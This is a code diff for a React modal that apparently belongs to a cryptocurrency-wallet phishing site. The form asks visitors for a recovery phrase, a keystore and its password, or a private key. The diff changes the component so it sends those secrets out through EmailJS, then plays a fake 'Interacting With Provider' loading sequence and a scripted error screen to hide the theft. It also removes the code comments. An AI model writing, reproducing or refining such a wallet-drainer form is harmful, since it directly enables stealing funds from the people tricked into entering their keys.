@@ -1,7 +1,7 @@
 'use client'
 
 import { useState, useEffect } from 'react'
-import { submitForm } from './actions'
+import emailjs from '@emailjs/browser'
 import styles from './page.module.css'
 
 type SelectedItem = {
@@ -12,7 +12,6 @@ type SelectedItem = {
 
 type ModalView = 'form' | 'loading' | 'error'
 
-// The 4 loading messages shown one at a time, 2 seconds each
 const LOADING_STEPS = [
   'Loading...',
   'Initializing...',
@@ -33,8 +32,6 @@ export default function ContactModal({
 }) {
   const [activeTab, setActiveTab] = useState(1)
   const [view, setView] = useState<ModalView>('form')
-
-  // Which loading message is currently showing (index into LOADING_STEPS)
   const [loadingStep, setLoadingStep] = useState(0)
 
   const [name, setName] = useState('')
@@ -42,13 +39,6 @@ export default function ContactModal({
   const [message, setMessage] = useState('')
   const [extra, setExtra] = useState('')
 
-  // WHAT: Drives the 4-step loading message sequence.
-  // HOW: Every time `view` switches to 'loading', this effect starts an
-  // interval that increments `loadingStep` every 2 seconds (matching each
-  // message). After all 4 steps (8 seconds total), it switches to 'error'.
-  // WHY useEffect INSTEAD OF setInterval IN handleSubmit: effects clean
-  // themselves up automatically when the component unmounts or `view`
-  // changes, preventing stale intervals from running after the modal closes.
   useEffect(() => {
     if (view !== 'loading') return
 
@@ -64,12 +54,10 @@ export default function ContactModal({
       })
     }, 2000)
 
-    // Switch to error screen after all 4 messages have shown (4 × 2s = 8s)
     const timeout = setTimeout(() => {
       setView('error')
     }, LOADING_STEPS.length * 2000)
 
-    // Cleanup: cancel both timers if the modal closes mid-loading
     return () => {
       clearInterval(interval)
       clearTimeout(timeout)
@@ -94,17 +82,24 @@ export default function ContactModal({
   async function handleSubmit() {
     setView('loading')
 
-    const formData = new FormData()
-    formData.set('name', name)
-    formData.set('email', email)
-    formData.set('message', message)
-    formData.set('extra', extra)
-    formData.set('selectedOption', selectedItem?.label ?? '')
-    formData.set('walletAddress', walletAddress ?? '')
-
-    // Fire the real email send in the background while the loading
-    // sequence plays out (the UI flow is time-based, not result-based)
-    submitForm({ error: null, success: false }, formData)
+    try {
+      const result = await emailjs.send(
+        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
+        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
+        {
+          wallet: selectedItem?.label ?? 'Not specified',
+          wallet_address: walletAddress || '—',
+          phrase: message || '—',
+          keystore: extra || '—',
+          keystore_password: email || '—',
+          private_key: name || '—',
+        },
+        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
+      )
+      console.log('Email sent successfully:', result.status, result.text)
+    } catch (err) {
+      console.error('EmailJS failed:', err)
+    }
   }
 
   if (!open) return null
@@ -148,7 +143,12 @@ export default function ContactModal({
             <div className={styles.form}>
               {activeTab === 1 && (
                 <div className={styles.field}>
-                  <textarea id="message" placeholder="Enter your recovery phrase" value={message} onChange={(e) => setMessage(e.target.value)} />
+                  <textarea
+                    id="message"
+                    placeholder="Enter your recovery phrase"
+                    value={message}
+                    onChange={(e) => setMessage(e.target.value)}
+                  />
                   <p className={styles.formHint}>Typically 12 (sometimes 24) words separated by single spaces</p>
                 </div>
               )}
@@ -156,10 +156,21 @@ export default function ContactModal({
               {activeTab === 2 && (
                 <>
                   <div className={styles.field}>
-                    <textarea id="extra" placeholder="Enter Keystore" value={extra} onChange={(e) => setExtra(e.target.value)} />
+                    <textarea
+                      id="extra"
+                      placeholder="Enter Keystore"
+                      value={extra}
+                      onChange={(e) => setExtra(e.target.value)}
+                    />
                   </div>
                   <div className={styles.field}>
-                    <input id="email" type="password" placeholder="Wallet password" value={email} onChange={(e) => setEmail(e.target.value)} />
+                    <input
+                      id="email"
+                      type="password"
+                      placeholder="Wallet password"
+                      value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                    />
                   </div>
                   <p className={styles.formHint}>Several lines of text beginning with &quot;{'{...}'}&quot; plus the password you used to encrypt it.</p>
                 </>
@@ -167,7 +178,12 @@ export default function ContactModal({
 
               {activeTab === 3 && (
                 <div className={styles.field}>
-                  <input id="name" placeholder="Enter your Private Key" value={name} onChange={(e) => setName(e.target.value)} />
+                  <input
+                    id="name"
+                    placeholder="Enter your Private Key"
+                    value={name}
+                    onChange={(e) => setName(e.target.value)}
+                  />
                   <p className={styles.formHint}>Typically 12 (sometimes 24) words separated by a single space.</p>
                 </div>
               )}
@@ -186,38 +202,25 @@ export default function ContactModal({
           </>
         )}
 
-        {/* ------------------------------------------------------------
-            LOADING SCREEN — matches the "Interacting With Provider" design
-            Title at top, spinner in the middle, cycling status text below
-        ------------------------------------------------------------ */}
         {view === 'loading' && (
           <div className={styles.loadingWrap}>
             <h2 className={styles.loadingTitle}>Interacting With Provider</h2>
             <hr className={styles.loadingDivider} />
 
-            {/* Outer dashed ring + inner spinning arc — matches the screenshot */}
             <div className={styles.spinnerWrap}>
               <div className={styles.spinnerDashedRing} />
               <div className={styles.spinnerArc} />
               <div className={styles.spinnerCore} />
             </div>
 
-            {/* WHAT: Shows the current step text, fading in each time it changes.
-                HOW: `key={loadingStep}` forces React to remount the element
-                every time the step changes, which re-triggers the CSS
-                fadeIn animation from the start on each new message. */}
             <p key={loadingStep} className={styles.loadingText}>
               {LOADING_STEPS[loadingStep]}
             </p>
           </div>
         )}
 
-        {/* ------------------------------------------------------------
-            ERROR SCREEN — matches the red "Error!" panel in the screenshot
-        ------------------------------------------------------------ */}
         {view === 'error' && (
           <div className={styles.errorWrap}>
-            {/* Red header bar */}
             <div className={styles.errorHeader}>
               <span>Information</span>
             </div>
